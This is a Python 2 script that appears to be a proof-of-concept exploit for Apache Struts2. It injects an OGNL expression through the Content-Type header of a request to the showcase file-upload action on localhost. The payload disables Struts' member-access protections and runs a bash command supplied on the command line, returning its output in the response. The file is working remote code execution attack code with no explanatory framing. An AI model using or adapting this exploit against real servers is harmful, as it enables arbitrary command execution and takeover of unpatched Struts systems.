import urllib2
import sys
from httplib import IncompleteRead

cmd = sys.argv[1]

headers = [('Host', 'localhost:8080'),
			('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0'),
			('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
			('Accept-Language', 'en-US,en;q=0.5'),
			('Accept-Encoding', 'gzip, deflate'),
			('Content-Length', '0')]

content_type = ("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                    "(#_memberAccess?(#_memberAccess=#dm):"
                    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                    "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
                    "(#context.setMemberAccess(#dm))))."
                    "(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','%s'}))."
                    "(#p.redirectErrorStream(true)).(#process=#p.start())."
                    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                    "(#ros.flush())}" %cmd)

url = 'http://localhost:8080/struts2-showcase/fileupload/upload.action'

r = urllib2.Request(url)
r.addheaders = headers
r.add_header('Content-Type', content_type)

resp = urllib2.urlopen(r)
try:
	print (resp.read())
except IncompleteRead as ex:
	print (ex.partial)